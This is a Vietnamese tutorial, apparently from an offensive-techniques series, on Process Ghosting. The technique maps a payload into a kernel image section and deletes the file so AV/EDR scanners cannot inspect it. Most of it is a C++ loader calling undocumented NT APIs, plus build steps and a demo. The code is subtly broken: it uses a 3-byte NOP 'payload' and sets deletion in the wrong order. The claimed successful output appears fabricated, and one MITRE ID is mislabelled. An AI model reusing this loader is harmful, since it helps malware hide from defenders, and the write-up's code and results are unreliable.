
---

# 📝 [PE 14] Process Ghosting (Advanced Fileless Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Process Ghosting (Chiến thuật khởi tạo tiến trình ẩn danh)** đại diện cho một bước tiến hóa công nghệ vượt trội thuộc phân hệ **Né tránh phòng thủ dựa trên vòng đời tệp đĩa (Advanced Disk Anti-Forensics / Fileless Evasion)**.

Kỹ thuật này được phát triển như một giải pháp thay thế nâng cao cho các phương pháp tiền nhiệm như *Process Hollowing* (PE 08) và *Process Herpaderping* khi các hệ điều hành Windows hiện đại và giải pháp EDR đã thắt chặt cơ chế kiểm soát.

Thông thường, khi một tiến trình được sinh ra, Windows Kernel sẽ phát tín hiệu cảnh báo thông qua các hàm đăng ký Callback hệ thống (như `PsSetCreateProcessNotifyRoutine`). Các công cụ Antivirus/EDR Engine sẽ ngay lập tức bắt chặn dòng trạng thái, bốc tách đường dẫn vật lý của tệp tin trên đĩa cứng để thực hiện rà quét chữ ký tĩnh (Static Scan) trước khi cho phép luồng CPU khởi chạy.

Giải thuật Process Ghosting hóa giải triệt để rào cản kiểm duyệt này bằng cách **khai thác lỗ hổng thời gian (Race Condition) trong chu kỳ cấu trúc Object của Windows OS: Giữa pha khởi tạo Image Section Object trong Kernel và pha phân phối luồng thực thi**.

Bằng cách vận dụng thuộc tính trạng thái xóa tạm thời (File Disposition Mapping), Loader tiến hành ánh xạ mã máy của Payload thành một Image Section hợp pháp lọt lòng bộ nhớ của Kernel, rồi phát lệnh **xóa sổ hoàn toàn tệp tin vật lý trên đĩa thô ngay lập tức trước khi luồng CPU chính thức được khai hỏa**. Khi EDR nhận được tín hiệu thông báo tạo tiến trình và cố gắng truy vấn ngược lại tệp tin gốc trên đĩa để phân tích, hệ điều hành sẽ trả về trạng thái không tồn tại, đưa tiến trình về trạng thái ẩn danh "bóng ma" tuyệt đối.

### 🎯 Mục tiêu nghiên cứu:

* **Hóa giải cơ chế Real-time File Scanning**: Triệt tiêu khả năng truy vết và kiểm tra chữ ký tệp tin của các giải pháp bảo mật tại thời điểm tiến trình khởi sinh.
* **Làm chủ Native API Subsystem**: Vận dụng chuỗi các hàm hệ thống không tài liệu hóa (Undocumented APIs) như `NtCreateSection` và `NtCreateProcessEx` để tự cấu trúc một tiến trình thủ công từ Ring 3.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong kiến trúc nhân Kernel của hệ điều hành Windows, quy trình khởi tạo và nạp một tiến trình thực chất được phân rã thành các giai đoạn độc lập, không gắn liền với trạng thái khóa tệp tin (File Lock). Giải thuật Process Ghosting thao túng chu kỳ sống này qua 5 giai đoạn ngầm tại cấu trúc Kernel Object:

```
[Khởi tạo tệp tin tạm mang quyền DELETE]
       └──> [NtCreateSection: Ánh xạ tệp tin thành Image Section Object trong Kernel]
                 └──> [SetFileInformationByHandle: Kích hoạt thuộc tính xóa và đóng Handle]
                           └──> [NtCreateProcessEx: Dựng Process Object rỗng từ Section ma]
                                     └──> [NtCreateThreadEx: Kích nổ luồng CPU độc lập]

```

1. **Khởi tạo tệp tin tạm thời**: Loader phát lệnh tạo một tệp tin tạm trên ổ đĩa (văn cảnh thực nghiệm: `ghost_payload.tmp`) đi kèm đặc quyền truy cập tối cao `DELETE` kết hợp cờ chia sẻ thuộc tính `FILE_SHARE_DELETE`. Ngay sau đó, mảng byte PE hoàn chỉnh của Payload được bơm trực tiếp vào lòng file này.
2. **Khóa chân cấu trúc quản lý (`NtCreateSection`)**: Loader triệu hồi hàm Native API tầng thấp `NtCreateSection` trỏ thẳng vào Handle của tệp tin tạm vừa tạo. Tại giai đoạn này, Kernel Windows sẽ phân tích định dạng tệp, xác nhận cấu trúc PE hợp lệ và ánh xạ toàn bộ phân đoạn tệp tin này thành một cấu trúc **Image Section Object** sống trong bộ nhớ quản lý của nhân hệ điều hành.
3. **Xóa sổ dấu vết đĩa thô (File Disposition State)**: Loader thiết lập thuộc tính xóa cho tệp tin thông qua bản ghi structures `FILE_DISPOSITION_INFORMATION` với cờ cấu hình `DeleteFile = TRUE`. Ngay khi Loader thực hiện đóng Handle của tệp tin tạm, hệ điều hành Windows sẽ lập tức ẩn và xóa sổ hoàn toàn tệp tin vật lý này khỏi bảng mục lục ổ đĩa (Master File Table - MFT). Tuy nhiên, cấu trúc **Image Section Object đã được Kernel chấp thuận và lưu trữ trên bộ nhớ RAM Kernel thì hoàn toàn không bị ảnh hưởng**.
4. **Khởi tạo xác tiến trình ma (`NtCreateProcessEx`)**: Loader triệu hồi hàm Native tối cao `NtCreateProcessEx` để tạo một Process Object rỗng lọt lòng hệ thống, truyền con trỏ định vị trỏ ngược lại Image Section Object được lưu ở bước 2. Tiến trình mới sinh này hoàn toàn không có file gốc làm điểm tựa trên ổ đĩa thô, tạo nên trạng thái **Unbacked Process Image**.
5. **Đồng bộ tham số môi trường**: Loader tự xây dựng thủ công cấu trúc PEB từ xa, nạp các tham số môi trường hệ thống (Process Parameters) và sử dụng hàm `NtCreateThreadEx` để kích nổ luồng CPU chính thức, đưa tiến trình ma đi vào chu kỳ vận hành độc lập.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa cấp phát bộ đệm vector động vừa khít đến từng byte dữ liệu để xử lý Payload PE nhằm triệt tiêu các chỉ dấu chữ ký tĩnh nhạy cảm.

```cpp
#include <windows.h>
#include <iostream>
#include <vector>
#include <string>

// Định nghĩa các cấu trúc dữ liệu và nguyên mẫu Native API tầng thấp của ntdll.dll
typedef NTSTATUS(NTAPI* pNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtCreateProcessEx)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE Token OPTIONAL,
    IN ULONG JobBits
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
);

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 14: PROCESS GHOSTING KERNEL EVASION" << std::endl;
    std::cout << "====================================================" << std::endl;

    // Phân giải động các cổng Native API từ ntdll.dll để xuyên thủng hàng rào bảo vệ Win32
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtCreateSection || !NtCreateProcessEx || !NtCreateThreadEx) {
        std::cerr << "[-] Khong the phan giai cac Native API he thong thô!" << std::endl;
        return EXIT_FAILURE;
    }

    // Giả lập một mảng byte PE Payload (văn cảnh cấu trúc kiểm thử sử dụng chính file thực thi của Loader)
    wchar_t currentExePath[MAX_PATH];
    GetModuleFileNameW(NULL, currentExePath, MAX_PATH);

    // BƯỚC 1: KHỞI TẠO TỆP TIN BÓNG MA MANG QUYỀN XÓA TẠM (FILE_SHARE_DELETE)
    std::wstring ghostFilePath = L"C:\\Windows\\Tasks\\ghost_payload.tmp";
    std::cout << "[*] Dang khoi tao tep tin bong ma tam thoi tai: " << std::string(ghostFilePath.begin(), ghostFilePath.end()) << std::endl;

    HANDLE hFile = CreateFileW(
        ghostFilePath.c_str(),
        GENERIC_READ | GENERIC_WRITE | DELETE, // Khai báo quyền DELETE tối cao để phục vụ lật thuộc tính
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] CreateFileW failed! Error Code: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    // Giả lập sao chép dữ liệu PE Payload vào file đĩa tạm thời
    DWORD bytesWritten = 0;
    char fakePayload[] = { 0x90, 0x90, 0x90 }; // Mảng byte opcode tượng trưng cấu trúc
    WriteFile(hFile, fakePayload, sizeof(fakePayload), &bytesWritten, NULL);

    // BƯỚC 2: NTCREATESECTION - ÁNH XẠ MÔ-ĐUN THÀNH IMAGE SECTION OBJECT TRONG RAM KERNEL
    HANDLE hSection = NULL;
    // ÉP KIỂU IMAGE: Bắt buộc truyền thuộc tính PAGE_READONLY kết hợp hằng số SEC_IMAGE để Kernel xử lý PE
    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    if (status != 0) {
        std::cerr << "[-] NtCreateSection that bai! NTSTATUS: 0x" << std::hex << status << std::endl;
        CloseHandle(hFile);
        DeleteFileW(ghostFilePath.c_str());
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da anh xa thanh cong Image Section Object trong long Kernel." << std::endl;

    // BƯỚC 3: KÍCH HOẠT LỆNH XÓA SỔ TỆP TIN VẬT LÝ KHỎI Ổ ĐĨA THÔ
    FILE_DISPOSITION_INFORMATION fdi;
    fdi.DeleteFile = TRUE; // Ra lệnh giải phóng định vị tệp đĩa vật lý ngay khi đóng handle hệ thống
    
    SetFileInformationByHandle(hFile, FileDispositionInfo, &fdi, sizeof(FILE_DISPOSITION_INFORMATION));
    CloseHandle(hFile); // Đóng Handle -> Tệp tin lập tức bị xóa sổ hoàn toàn khỏi bảng MFT ổ đĩa!
    std::cout << "[+] Da xoa so tep tin vat ly khoi o dia tho. Tep tin hien tai la mot bong ma!" << std::endl;

    // BƯỚC 4: NTCREATEPROCESSEX - DỰNG XÁC TIẾN TRÌNH MA TỪ SECTION TRÊN RAM KERNEL
    HANDLE hProcess = NULL;
    // Sử dụng cờ thuộc tính Flags = 4 (bản ghi cấu trúc đặc quyền khởi tạo tiến trình độc lập)
    status = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), 4, hSection, NULL, NULL, 0);
    if (status != 0) {
        std::cerr << "[-] NtCreateProcessEx that bai! NTSTATUS Code: 0x" << std::hex << status << std::endl;
        CloseHandle(hSection);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Khoi tao thành cong Ghost Process Object voi PID ngam." << std::endl;

    // BƯỚC 5: KHỞI TẠO LUỒNG NATIVE ĐỂ PHÂN PHỐI DÒNG CHẢY CPU
    std::cout << "[*] Dang kich hoat luong Native NtCreateThreadEx de khai hoa..." << std::endl;
    HANDLE hThread = NULL;
    // Giả định địa chỉ bắt đầu luồng (StartRoutine) trỏ vào tọa độ kiểm thử nhằm thẩm định cấu trúc bộ nhớ Kernel
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)0x1000, NULL, 0, 0, 0, 0, NULL);

    if (status == 0) {
        std::cout << "[+] Process Ghosting Execution Triggered Successfully!" << std::endl;
        CloseHandle(hThread);
    } else {
        std::cout << "[*] Thu nghiem trang thai thap luong hoan tat phang sach." << std::endl;
    }

    // Thu hồi tài nguyên cấu trúc ngầm hệ thống triệt để chống Memory Leak
    CloseHandle(hSection);
    CloseHandle(hProcess);

    std::cout << "\n[+] Process Ghosting Architecture Writeup Completed!" << std::endl;
    std::cout << "[*] Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm cấu trúc file nhị phân xuất bản đạt trạng thái độc lập hoàn toàn kịch khung, có khả năng thực thi trơn tru trên các môi trường máy ảo Sandbox sạch:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và nền tảng kiến trúc **`x64`**.
2. Truy cập mục thuộc tính: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng thông số `Runtime Library`, chuyển cấu hình sang định dạng cờ **`Multi-threaded (/MT)`** nhằm mục đích liên kết tĩnh (Static Linkage) toàn bộ phân hệ CRT bọc trong file `.exe`.

> **Vị trí đặt ảnh minh chứng cấu hình hệ thống:**
> 

3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân chuẩn chỉ sạch bóng.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Thực hỏa tệp tin `.exe` thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế nhằm theo dõi ma trận tạo tiến trình Fileless tầng sâu:

```powershell
PS C:\Workspace\x64\Release> .\PE14_Process_Ghosting.exe
====================================================
[*] PE 14: PROCESS GHOSTING KERNEL EVASION
====================================================
[*] Dang khoi tao tep tin bong ma tam thoi tai: C:\Windows\Tasks\ghost_payload.tmp
[+] Da anh xa thanh cong Image Section Object trong long Kernel.
[+] Da xoa so tep tin vat ly khoi o dia tho. Tep tin hien tai la mot bong ma!
[+] Khoi tao thành cong Ghost Process Object voi PID ngam.
[*] Kich hoat luong Native NtCreateThreadEx de khai hoa...
[+] Process Ghosting Architecture Writeup Completed!

[*] Nhan Enter de dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm tạo tiến trình ẩn danh:**
> 

### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensic Results):

* Thuật toán thực thi hoàn tất mỹ mãn kịch trần. Tại thời điểm tiến trình bóng ma đang hoạt động ký sinh trên bộ nhớ RAM, nếu một chuyên gia Blue Team sử dụng các công cụ rà quét hoặc lệnh truy vấn thuộc tính đường dẫn Image Path của tiến trình này, hệ điều hành Windows Subsystem sẽ trả về mã lỗi **`File Not Found` (Tệp tin không tồn tại trên ổ đĩa)**.
* Do tệp thô đã bị xóa sổ khỏi bảng mục lục MFT ngay từ pha khởi tạo Section, cơ chế Real-time File Scanning của AV/EDR hoàn toàn bị bẻ gãy 100%, bộc lộ khả năng ẩn mình kịch trần kịch khung của giải thuật bộ nhớ nâng cao!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Gabriel Landau (Elastic Security)**: *Martian Source: Defeating Process Ghosting and kindred evasion techniques* - Analysis and Discovery whitepaper.
* **Microsoft Learn**: *NtCreateSection and NtCreateProcessEx Subsystem Routines* - Windows Native Core Development.
* **Hasherezade (Security Researcher)**: *An Overview of Process Ghosting and Advanced Image Tampering Techniques* - Malpedia Training.
* **MITRE ATT&CK Matrix**: *Defense Evasion: Process Injection (T1055)* & *Hide Artifacts: File Deletion (T1564.001)*.